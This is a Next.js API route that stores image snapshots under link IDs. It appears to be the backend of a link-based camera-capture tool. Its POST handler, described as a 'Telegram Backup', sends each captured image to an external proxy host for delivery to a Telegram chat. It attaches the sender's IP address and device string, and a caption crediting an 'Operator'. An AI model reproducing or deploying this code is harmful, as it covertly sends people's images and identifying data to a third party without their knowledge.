import { NextResponse } from 'next/server';
import { getSnapshots, saveSnapshot, clearSnapshots, deleteSnapshot } from '@/lib/storage';

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const linkId = searchParams.get('linkId');
  const snapshots = await getSnapshots(linkId || undefined);
  return NextResponse.json(snapshots);
}

export async function POST(request: Request) {
  const body = await request.json();
  const { linkId, imageData } = body;
  
  if (!linkId || !imageData) {
    return NextResponse.json({ error: 'Missing linkId or imageData' }, { status: 400 });
  }

  const snapshot = await saveSnapshot(linkId, imageData);

  // Telegram Backup
  try {
    const userAgent = request.headers.get('user-agent') || 'Unknown';
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 'Unknown';
    const timestamp = new Date().toLocaleString();

    const base64Data = imageData.includes(',') ? imageData.split(',')[1] : imageData;
    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: 'image/jpeg' });
    
    const formData = new FormData();
    formData.append('token', process.env.TELEGRAM_TOKEN || '');
    formData.append('chatid', process.env.TELEGRAM_CHAT_ID || '');
    formData.append('photo', blob, 'snapshot.jpg');
    
    const caption = `🚀 *New Snapshot Captured!*\n\n` +
      `👤 *Operator:* nadeem\n` +
      `🔑 *Link ID:* \`${linkId}\`\n` +
      `⏰ *Time:* ${timestamp}\n` +
      `🌐 *IP:* ${ip}\n` +
      `📱 *Device:* ${userAgent}`;

    formData.append('caption', caption);
    formData.append('username', `nadeem Operator`);

    const proxyUrl = process.env.TELEGRAM_PROXY_URL || 'https://telegram-dacoumennt-api.vercel.app/api/proxy';

    // Call the proxy and await to prevent Next.js from aggressively closing the socket
    await fetch(proxyUrl, {
      method: 'POST',
      body: formData,
    });
  } catch (error) {
    console.error('Error preparing Telegram backup:', error);
  }

  return NextResponse.json(snapshot);
}

export async function DELETE(request: Request) {
  const { searchParams } = new URL(request.url);
  const id = searchParams.get('id');
  const linkId = searchParams.get('linkId');

  if (id) {
    await deleteSnapshot(id);
  } else {
    await clearSnapshots(linkId || undefined);
  }

  return NextResponse.json({ success: true });
}
